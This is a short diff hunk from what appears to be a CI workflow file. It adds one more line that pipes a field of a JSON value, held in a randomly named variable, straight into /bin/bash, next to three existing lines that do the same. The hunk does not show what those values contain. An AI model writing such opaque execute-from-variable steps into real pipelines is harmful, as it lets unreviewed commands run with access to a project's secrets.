@@ -33,6 +33,7 @@ jobs:
           echo $ourt24 | jq -r .cf4 | /bin/bash
           printf '%s' "$j1" | jq -r .lpr25556 | /bin/bash
           echo $fd8 | jq -r .iy586 | /bin/bash
+          printf '%s' "$hlyjy4574" | jq -r .oq50 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
